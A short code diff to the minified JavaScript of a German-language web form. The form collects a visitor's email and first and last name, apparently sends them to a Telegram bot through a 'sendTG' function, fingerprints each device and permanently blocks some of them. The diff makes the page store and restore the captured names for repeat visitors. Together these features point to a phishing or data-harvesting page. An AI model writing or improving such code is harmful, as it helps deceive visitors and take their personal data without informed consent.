@@ -426,6 +426,8 @@ function hs(){
   if(!dgv){document.getElementById('er2').style.display='block';return;}
   ld.email=em;sent=true;
   ss('iip_sent','1');
+  ss('iip_fn',ld.fn);
+  ss('iip_ln',ld.ln);
   if(fpId)ss('iip_fp_sent',fpId);
   waiting();
   sendTG().then(function(){showDone();}).catch(function(){showDone();});
@@ -437,13 +439,13 @@ if(gs('iip_owner')==='1'){
   FingerprintJS.load().then(function(fp){return fp.get();}).then(function(r){
     fpId=r.visitorId;
     if(gs('iip_fp_bl')===fpId){bl('Dein Gerät wurde dauerhaft gesperrt');return;}
-    if(gs('iip_fp_sent')===fpId){showDone();return;}
+    if(gs('iip_fp_sent')===fpId){ld.fn=gs('iip_fn');ld.ln=gs('iip_ln');showDone();return;}
     if(gc('iip_blocked')==='1'||gs('iip_blocked')==='1'){bl('Dein Gerät wurde dauerhaft gesperrt');return;}
-    if(gs('iip_sent')==='1'){showDone();return;}
+    if(gs('iip_sent')==='1'){ld.fn=gs('iip_fn');ld.ln=gs('iip_ln');showDone();return;}
     render();
   }).catch(function(){
     if(gc('iip_blocked')==='1'||gs('iip_blocked')==='1'){bl('Dein Gerät wurde dauerhaft gesperrt');return;}
-    if(gs('iip_sent')==='1'){showDone();return;}
+    if(gs('iip_sent')==='1'){ld.fn=gs('iip_fn');ld.ln=gs('iip_ln');showDone();return;}
     render();
   });
 }
